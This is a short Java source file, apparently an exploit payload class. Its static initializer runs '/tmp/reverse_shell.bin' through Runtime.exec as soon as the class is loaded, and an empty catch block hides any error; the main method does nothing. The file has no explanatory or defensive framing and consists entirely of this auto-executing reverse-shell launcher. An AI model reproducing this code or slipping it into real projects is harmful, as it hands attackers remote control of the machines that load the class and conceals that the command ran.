import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.Runtime;

public class exec_code{
	static {
		try{

			String cmd = "/tmp/reverse_shell.bin";
			InputStream	in = Runtime.getRuntime().exec(cmd).getInputStream();
			InputStreamReader i = new InputStreamReader(in,"GBK");

		}catch(Exception e){

		}
	}	
	public static void main(String[] args){

	}
}
